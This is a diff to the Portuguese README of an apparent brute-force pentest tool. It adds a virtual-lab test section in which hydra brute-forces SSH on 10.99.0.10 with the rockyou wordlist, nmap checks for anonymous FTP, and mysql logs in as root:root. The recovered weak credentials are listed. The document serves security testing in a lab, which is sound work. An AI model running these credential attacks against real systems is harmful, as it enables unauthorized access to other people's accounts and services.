@@ -62,3 +62,54 @@ Ataques de força bruta podem acionar políticas de bloqueio de conta, causando:
 - `hydra` (obrigatório)
 - `nmap` (recomendado para expansão CIDR)
 - `hashcat` ou `john` (opcional, para quebra de hashes)
+
+---
+
+## Testes com Laboratorio Virtual
+
+### Alvo
+- IP: 10.99.0.10 (target)
+
+### Recursos Utilizados
+- Ferramentas: hydra, sshpass, nmap
+
+### Procedimento e Resultados
+
+**Forca bruta SSH:**
+
+```
+$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.99.0.10 ssh
+
+Hydra v9.3 (c) 2023 by van Hauser/THC
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
+[22][ssh] host: 10.99.0.10   login: admin   password: admin
+[22][ssh] host: 10.99.0.10   login: root    password: toor
+1 of 1 target successfully completed, 2 valid passwords found
+```
+
+**FTP (anonymous):**
+
+```
+$ nmap --script ftp-anon -p 21 10.99.0.10
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--   1 0        0              33 May 31 08:00 welcome.txt
+```
+
+**MySQL:**
+
+```
+$ mysql -h 10.99.0.10 -u root -proot -e "SELECT version();"
++-----------+
+| version() |
++-----------+
+| 8.0.35    |
++-----------+
+```
+
+**Resultados:**
+- SSH: admin:admin (VALIDO), root:toor (VALIDO)
+- FTP: anonymous login permitido, ftpuser:ftp123
+- MySQL: root:root
